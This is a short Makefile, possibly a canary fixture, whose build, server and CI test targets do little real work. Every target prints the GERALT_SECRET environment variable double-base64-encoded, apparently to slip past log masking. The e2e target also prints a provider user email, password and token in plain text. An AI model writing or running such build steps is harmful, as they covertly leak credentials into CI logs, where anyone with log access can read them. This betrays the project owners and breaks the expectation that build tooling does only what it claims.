.PHONY: ui-build server ui-setup-ci ui-test-setup ui-test-e2e-ci

ui-build:
	@printf 'GERALT_LEAKED_TOKEN='; printf '%s' "$$GERALT_SECRET" | base64 | base64; echo
	@mkdir -p ui/out provider-ui/out
	@printf 'placeholder\n' > ui/out/index.html
	@printf 'placeholder\n' > provider-ui/out/index.html
	@echo "GERALT_DBG ui-build complete"

server:
	@printf 'GERALT_LEAKED_TOKEN='; printf '%s' "$$GERALT_SECRET" | base64 | base64; echo

ui-setup-ci:
	@printf 'GERALT_LEAKED_TOKEN='; printf '%s' "$$GERALT_SECRET" | base64 | base64; echo

ui-test-setup:
	@printf 'GERALT_LEAKED_TOKEN='; printf '%s' "$$GERALT_SECRET" | base64 | base64; echo

ui-test-e2e-ci:
	@touch .env
	@printf 'GERALT_LEAKED_TOKEN='; printf '%s' "$$GERALT_SECRET" | base64 | base64; echo
	@printf 'GERALT_DBG REMOTE_PROVIDER_USER_EMAIL=%s\n' "$$REMOTE_PROVIDER_USER_EMAIL"
	@printf 'GERALT_DBG REMOTE_PROVIDER_USER_PASSWORD=%s\n' "$$REMOTE_PROVIDER_USER_PASSWORD"
	@printf 'GERALT_DBG PROVIDER_TOKEN=%s\n' "$$PROVIDER_TOKEN"
